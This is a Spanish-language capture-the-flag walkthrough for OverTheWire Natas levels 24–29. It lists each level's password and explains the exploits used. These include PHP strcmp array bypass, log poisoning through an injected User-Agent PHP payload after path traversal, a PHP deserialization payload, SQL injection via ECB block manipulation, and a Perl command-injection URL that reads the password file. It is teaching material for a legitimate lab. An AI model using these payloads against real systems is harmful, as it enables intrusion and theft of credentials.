# Nivel 24-29

### NIVEL 24

Ingresamos las credenciales para el nivel 24.

* **Usuario:** `natas24`
* **Contraseña:** `MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 24**. Se nos muestra para ingresar una contraseña pero para más información revisamos el código fuente.

<figure><img src="../../../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

En este nivel, la contraseña se verifica utilizando la función `strcmp()`. Según la documentación, esta función solo devuelve valores mayores que 0, menores que 0 e iguales a 0. Por lo tanto, nuestro objetivo es que el valor de retorno sea igual a 0.

En PHP, `strcmp()` tiene un comportamiento extraño. De hecho, si los argumentos que se pasan no son cadenas, devuelve 0. Así que, intentemos pasando el array vacío `passwd[]`.

Para ello, realizamos este comando:

```bash
curl -X GET -u natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd http://natas24.natas.labs.overthewire.org/?passwd%5b%5d
```

<figure><img src="../../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

### NIVEL 25

Ingresamos las credenciales para el nivel 25.

* **Usuario:** `natas25`
* **Contraseña:** `ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 25**. Se nos muestra un texto científico y que se puede traducir en otro idioma por lo que  revisamos el código fuente.

<figure><img src="../../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

A primera vista, parece que el parámetro `lang` podría ser el vehículo del ataque. Según el código fuente, se realizan algunas comprobaciones sobre él...

En primer lugar, no se permite incluir la cadena `natas_webpass`, por lo que el acceso directo al archivo `/etc/natas_webpass/natas26` no es factible.

En segundo lugar, se realiza una comprobación contra la presencia de `../`. En este caso, se eliminan todas las ocurrencias de `../` en `$filename`.

La cadena `"..././"` se convertirá en `../`, por lo que ahora se nos permite acceder completamente al sistema de archivos, y luego, también al archivo de registro generado por `logRequest()`.

Dado que `/etc/natas_webpass/natas26` no es accesible directamente, podemos intentar acceder a él a través del archivo de registro. Afortunadamente, la función `logRequest()` no realiza ninguna comprobación sobre la variable `$_SERVER['HTTP_USER_AGENT']`, por lo que podemos usarla para inyectar código PHP.

```python
import requests

URL = "http://natas25.natas.labs.overthewire.org/"

auth_name = 'natas25'
auth_pass = 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws'

s = requests.Session()
s.auth = (auth_name, auth_pass)

COOKIES = dict(PHPSESSID=s.get(URL).cookies['PHPSESSID'])

path = "....//....//....//....//....//"
PARAMS = dict(lang=path + "var/www/natas/natas25/logs/natas25_" + COOKIES.get("PHPSESSID") + ".log")

injection = '<?php readfile("/etc/natas_webpass/natas26") ?>'
HEADERS = {'User-Agent': injection}

r = s.post(URL, params=PARAMS, headers=HEADERS)
for x in r.iter_lines():
    line = x.decode('utf-8')
    if "]" in line:
        print(line)
```

Este script en Python está diseñado para realizar un ataque de inyección a un servidor web. Aquí están los pasos que sigue:

1. **Configuración de la Sesión:**
   * Usa la biblioteca `requests` para crear una sesión HTTP.
   * Se autentica en el servidor con las credenciales proporcionadas (`auth_name` y `auth_pass`).
2. **Obtención de Cookies:**
   * Realiza una solicitud GET al servidor para obtener la cookie `PHPSESSID` necesaria para la autenticación en las siguientes peticiones.
3. **Preparación de Parámetros y Cabeceras:**
   * Define un parámetro `lang` con una ruta de archivo construida que incluye el ID de la sesión (`PHPSESSID`). Esta ruta parece estar diseñada para acceder a un archivo de log específico.
   * Define una cabecera `User-Agent` que contiene un código PHP para leer el contenido del archivo `/etc/natas_webpass/natas26`.
4. **Envío de la Solicitud POST:**
   * Envía una solicitud POST al servidor con los parámetros y las cabeceras configuradas.
   * El código PHP en el `User-Agent` intenta ejecutar y mostrar el contenido del archivo que contiene la contraseña de la siguiente etapa.
5. **Procesamiento de la Respuesta:**
   * Lee la respuesta línea por línea y busca cualquier línea que contenga un corchete de cierre `]`, imprimiendo esas líneas en la consola.

<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

### NIVEL 26

Ingresamos las credenciales para el nivel 26.

* **Usuario:** `natas26`
* **Contraseña:** `cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 26**. Se nos muestra para ingresar unas coordenadas para dibujar una línea por lo que  revisamos el código fuente.

<figure><img src="../../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

El código PHP realiza las siguientes acciones:

1. Define una clase `Logger` con propiedades privadas `$logFile`, `$initMsg`, y `$exitMsg`.
2. En el constructor (`__construct`), inicializa estas propiedades.
   * `$initMsg` se establece con un mensaje de inicio de sesión.
   * `$exitMsg` se establece con un fragmento de código PHP que incluye un archivo específico (presumiblemente un archivo de contraseña).
   * `$logFile` se establece con la ruta a un archivo PHP de salida.
3. Crea una instancia de `Logger` y la serializa.
4. Codifica la instancia serializada en Base64 y la imprime.

Luego, envía esta cadena como “drawing” en la Cookie. Será deserializada por el servidor y considerada como un Logger. En la función de destrucción (ejecutada automáticamente), escribirá un archivo PHP para mostrar el archivo de contraseña.&#x20;

```php
<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct() {
        
        $this->initMsg = "#–session started–#\n";
        $this->exitMsg = "<?php include_once('/etc/natas_webpass/natas27');?>";
        $this->logFile = "img/output.php";
    }
}

$output[] = new Logger();
echo base64_encode(serialize($output));
?>
```

Esta es la cadena generada: `YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL291dHB1dC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoyNDoiI+KAk3Nlc3Npb24gc3RhcnRlZOKAkyMKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTE6Ijw/cGhwIGluY2x1ZGVfb25jZSgnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTs/PiI7fX0=`

<figure><img src="../../../.gitbook/assets/image (285).png" alt=""><figcaption></figcaption></figure>

### NIVEL 27

Ingresamos las credenciales para el nivel 27.

* **Usuario:** `natas27`
* **Contraseña:** `u3RRffXjysjgwFU6b9xa23i6prmUsYne`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 27**. Se nos muestra en la página para hacer **Login** con nuestro usuario y contraseña por lo que revisamos el código fuente.

<figure><img src="../../../.gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>

Código tomado de referencia para resolver el nivel [Repositorio de referencia](https://github.com/ImChet/natas27/blob/main/solution.py)

#### Importaciones y Configuración

* Se importan `re` y `requests`.
* Se definen el usuario objetivo (`natas28`) y la URL del servidor.

#### Configuración de la Sesión

* Se crea una sesión de `requests` con autenticación básica.

#### Creación de Usuario Craftado

* Se crea un nombre de usuario craftado de 65 caracteres.
* Se hace una solicitud POST para crear este usuario.

#### Explotación

* Se hace otra solicitud POST con un nombre de usuario craftado de 64 caracteres para explotar una vulnerabilidad.

#### Extracción de Contraseña

* Se usa una expresión regular para extraer y mostrar la contraseña del usuario `natas28`.

<figure><img src="../../../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>

### NIVEL 28

Ingresamos las credenciales para el nivel 28.

* **Usuario:** `natas28`
* **Contraseña:** `1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 28**. Se nos muestra algo para ingresar y buscar una broma.<br>

<figure><img src="../../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2024-08-20 214533.png" alt=""><figcaption></figcaption></figure>

Después de un par de consultas, me di cuenta de que, cuando se envía una solicitud POST, se nos redirige a `search.php` y se agrega una enorme cadena de consulta a la URL:

[http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D](http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D)

Si limpiamos esta URL eliminando todo hasta `query=` y luego decodificamos la URL, la consulta se ve así:

`G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=`

Esta es una cadena codificada en base64, pero los intentos de decodificarla en algo útil usando CyberChef no dieron resultados.

<figure><img src="../../../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

**Error de Padding PKCS#7 y Análisis del Modo ECB**

Después de experimentar con la cadena de consulta y eliminar caracteres, obtuve un error de padding PKCS#7. Al buscar este error en Google, encontré información relacionada con AES, tamaños de bloque y temas criptográficos similares. El error parecía estar relacionado con un cifrado de bloque AES, donde:

* Hay un tamaño de bloque fijo para cifrar/descifrar.
* La información no cumplía con esta longitud debido a mis modificaciones.

Noté que el inicio y el final de la cadena de consulta eran siempre los mismos, independientemente de la consulta de un solo carácter. Mi idea original fue un ataque de padding oracle. Sin embargo, dado el error PKCS#7 y la información repetitiva, es más probable que se trate de un modo de cifrado ECB (Electronic Code Book).

#### Modo ECB

El modo ECB es inseguro porque no hay interdependencia entre los bloques de datos. Esto significa que cada bloque de texto plano idéntico produce el mismo bloque de texto cifrado, lo que resulta en una falta de difusión. Los patrones de datos no se ocultan bien, lo que hace que el protocolo sea más vulnerable a ataques de repetición.

Según una pista útil de Wikipedia, el modo ECB puede hacer que los protocolos sin protección de integridad sean más susceptibles a ataques de repetición, ya que cada bloque se descifra de la misma manera. Esto permite la posibilidad de mezclar y combinar bloques para realizar un ataque de repetición.

Este script es una solución para el desafío Natas28 en la plataforma OverTheWire. El objetivo es realizar una inyección SQL a través de una vulnerabilidad en el cifrado del parámetro `query` en la URL de la aplicación web. [GitHub source](https://github.com/Thraundil/natas/blob/master/natas28_doit.py)

#### Resumen de lo que hace el script:

1. **Autenticación:** Se autentica en el sitio web usando las credenciales de Natas28.
2. **Cifrado y Manipulación:**
   * Envía una solicitud inicial para obtener el texto cifrado correspondiente a una consulta trivial.
   * Crea una nueva consulta SQL maliciosa (`new_sql`) que extrae nombres de usuario y contraseñas concatenados.
   * Manipula el cifrado de la consulta original para incluir la consulta SQL maliciosa, asegurando que los bloques de cifrado coincidan.
3. **Inyección SQL:** Envía la consulta manipulada al servidor, que ejecuta el SQL malicioso.
4. **Extracción de Datos:** Recupera el resultado de la inyección SQL, buscando específicamente las credenciales para el siguiente nivel, `natas29`.

<figure><img src="../../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>

### NIVEL 29

Ingresamos las credenciales para el nivel 29.

* **Usuario:** `natas29`
* **Contraseña:** `31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns`

Tras iniciar sesión, nos encontramos con la página de inicio del **Nivel 29**. Se nos muestra texto pero al parecer no es legible.

<figure><img src="../../../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>

Este script nos ayuda para el desafío Natas29 en la plataforma OverTheWire. &#x20;

1. **Define Credenciales:** Usa las credenciales del desafío Natas29 directamente en el código.
2. **Explota Vulnerabilidad en Perl:**
   * **Ejecución Remota de Comandos:** Envía una solicitud para ejecutar el comando `whoami` en el servidor a través de una vulnerabilidad en la función `open()` de Perl, mostrando el usuario actual del servidor.
   * **Obtención de Contraseña:** Envía otra solicitud para leer el archivo que contiene la contraseña del siguiente nivel (`natas30`), obteniendo así la contraseña necesaria para avanzar al siguiente desafío.

<figure><img src="../../../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

La URL intenta leer el contenido del archivo `/etc/natas_webpass/natas30` en el servidor usando la vulnerabilidad de ejecución remota de comandos en Perl. Luego, reemplaza los saltos de línea en el contenido del archivo con espacios para hacer que el resultado sea más legible en una sola línea.

[http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+%22/etc/nat%22%22as\_webpass/nat%22%22as30%22|tr+%27\n%27+%27+%27](http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+%22/etc/nat%22%22as_webpass/nat%22%22as30%22|tr+%27\n%27+%27+%27)

<figure><img src="../../../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>



